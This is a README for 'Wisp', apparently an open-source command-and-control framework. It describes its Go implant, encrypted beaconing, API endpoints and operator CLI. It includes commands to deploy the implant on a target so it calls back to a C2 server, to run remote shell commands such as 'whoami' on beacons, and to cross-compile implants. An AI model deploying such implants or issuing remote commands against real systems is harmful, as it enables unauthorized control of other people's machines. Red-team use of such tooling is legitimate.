# 🌫️ Wisp

[![Go](https://img.shields.io/badge/Go-1.24%2B-00ADD8?logo=go)](https://go.dev)
[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?logo=python)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![GitHub](https://img.shields.io/badge/github-mandoof1%2Fwisp-181717?logo=github)](https://github.com/mandoof1/wisp)
[![Demo](https://img.shields.io/badge/demo-asciinema-1A1A1A?logo=asciinema)](demo.cast)
_Run `asciinema play demo.cast` to watch the demo._

A lightweight, encrypted command-and-control framework. Ephemeral as a will-o'-wisp —
here just long enough to beacon, then gone.

**Go implant · Python FastAPI server · SQLite · X25519 forward secrecy**

## Features

| | Feature | Detail |
|---|---------|--------|
| 🔐 | **X25519 key exchange** | Ephemeral per-session forward secrecy |
| 🔑 | **PSK fallback** | Backwards compatible — no handshake endpoint? Falls back to AES-256-GCM PSK |
| 🧩 | **Cross-platform implant** | Linux x86_64, ARM64, Windows amd64, macOS amd64 |
| 🖥️ | **Interactive CLI** | Tab-completion, live `watch` mode, beacon management |
| 📦 | **SQLite backend** | Zero config — single binary + single file |
| 🎲 | **Jitter** | Randomized sleep ±30% per beacon cycle |
| 📐 | **Clean codebase** | ~1500 lines, documented, modular |

## Demo

Play the recorded session locally:

```bash
asciinema play demo.cast
```

The demo shows a fresh server start, implant registration, task creation (`whoami`), and result retrieval — all 5 verification steps passing:

```
1. Health check
  ✓ Server is running
2. Waiting for implant to register...
  ✓ Beacon registered
3. Beacon details
  ✓ Beacon detail retrieved
4. Issuing command: whoami
  ✓ Task created
5. Polling for result...
  RESULT — meowman
  ✓ Task completed successfully
```

## Quick Start

```bash
# 1. Start the server
cd c2-framework
.venv/bin/python3 -m server.main &

# 2. Deploy the implant (target side)
C2_SERVER_URL="http://your-c2:8443" ./build/implant

# 3. Open the operator CLI
.venv/bin/python3 client/c2cli.py -s http://127.0.0.1:8443
```

Then inside the CLI:

```
c2> beacons
┌──────────────────────────────────────┬──────────┬──────────────────────┐
│ ID                                   │ Status   │ Last Seen            │
├──────────────────────────────────────┼──────────┼──────────────────────┤
│ 5ffb4c46-8578-4814-b611-d4e0bb414967 │ online   │ 2026-06-10T18:30:00Z │
└──────────────────────────────────────┴──────────┴──────────────────────┘

c2> run 5ffb4c46-8578-4814-b611-d4e0bb414967 whoami
c2> watch 5ffb4c46-8578-4814-b611-d4e0bb414967
→ status: complete
→ output: meowman
```

## Architecture

```
┌─────────────────┐         HTTPS/JSON          ┌──────────────────┐        ┌──────────────────┐
│                 │   AES-256-GCM payloads       │                  │        │                  │
│   Go Implant    │ ◄──────────────────────────► │  FastAPI Server  │ ◄─────►│   Python CLI     │
│  (target host)  │     X25519 handshake         │   + SQLite       │        │  (operator box)   │
│                 │                              │                  │        │                  │
└─────────────────┘                              └──────────────────┘        └──────────────────┘
```

**Beacon cycle:**

```
Implant                          Server                           CLI
  │                                │                                │
  │  POST /api/v1/handshake        │                                │
  │  ────────────────────────────► │  X25519 ephemeral keypair      │
  │  ◄── X25519 session key        │                                │
  │                                │                                │
  │  POST /api/v1/register         │                                │
  │  [X-Key-ID + encrypted payload]│                                │
  │  ────────────────────────────► │                                │
  │                                │                                │
  │  POST /api/v1/poll             │                                │  POST /api/v1/beacons/:id/tasks
  │  ────────────────────────────► │  ◄───────────────────────────── │
  │  ◄── {tasks}                   │                                │
  │                                │                                │
  │  POST /api/v1/result           │                                │
  │  ────────────────────────────► │                                │
  │                                │  GET /api/v1/beacons/:id/tasks │
  │                                │  ────────────────────────────► │
```

## Encryption

| Layer | Detail |
|-------|--------|
| **Algorithm** | AES-256-GCM (authenticated encryption) |
| **Key exchange** | X25519 ECDH per session (forward secrecy) |
| **Key derivation** | `SHA-256(shared_secret \|\| "c2-framework-v1")` |
| **Fallback** | Static 32-byte PSK via `C2_PSK` env var |
| **Payload format** | `nonce_hex:ciphertext_b64` in JSON envelope |
| **Key transport** | `X-Key-ID` header (implant's public key hex) |
| **Nonce** | Random 12 bytes per message |

The implant performs a one-time X25519 handshake on startup. If the server doesn't support it (404), it falls back to the pre-shared key — so an old server won't break a new implant and vice versa.

## API Endpoints

### Encrypted (implant ↔ server)

| Method | Path | Description |
|--------|------|-------------|
| POST | `/api/v1/handshake` | X25519 key exchange |
| POST | `/api/v1/register` | Beacon registration |
| POST | `/api/v1/poll` | Task polling |
| POST | `/api/v1/result` | Submit execution result |

### Plaintext (operator ↔ server)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Health check |
| GET | `/api/v1/beacons` | List all beacons |
| GET | `/api/v1/beacons/:id` | Beacon details |
| DELETE | `/api/v1/beacons/:id` | Remove beacon + tasks |
| GET | `/api/v1/beacons/:id/tasks` | List tasks |
| POST | `/api/v1/beacons/:id/tasks` | Create task |

## CLI Commands

```
beacons              List all registered beacons
beacon <id>          Show beacon details
tasks <id> [limit]   Show tasks for a beacon (default: 10)
run <id> <cmd...>    Send a shell command to a beacon
watch <id>           Live-poll for results (5s interval)
delete <id>          Remove beacon all data
help                 Show this help
exit                 Exit the CLI
```

## Building

```bash
# Current platform (quick build)
cd implant && go build -o ../build/implant .

# All targets
IMPLANT_PSK="your_64_hex_chars" \
  IMPLANT_URL="https://your-c2.com" \
  bash build/build.sh all
```

Targets: `linux/amd64`, `linux/arm64`, `windows/amd64`, `darwin/amd64`.

## Project Structure

```
c2-framework/
├── DESIGN.md               # Architecture & protocol spec
├── LICENSE                 # MIT
├── README.md               # This file
├── server/                 # Python FastAPI server
│   ├── main.py             # Uvicorn entrypoint
│   ├── config.py           # Server config
│   ├── crypto.py           # AES-256-GCM + X25519
│   ├── database.py         # SQLAlchemy models
│   ├── routes.py           # API route handlers
│   └── requirements.txt    # Python dependencies
├── implant/                # Go implant
│   ├── go.mod
│   ├── main.go             # Entrypoint + beacon loop
│   ├── config.go           # Server URL config
│   ├── crypto.go           # AES-256-GCM + X25519
│   └── beacon.go           # HTTP client + protocol
├── client/
│   ├── c2cli.py            # Interactive operator CLI
│   └── requirements.txt    # Python dependencies
├── build/
│   ├── build.sh            # Cross-compilation script
│   └── implant             # Compiled binary (gitignored)
└── .gitignore
```

## License

MIT — do what you want, don't blame me.
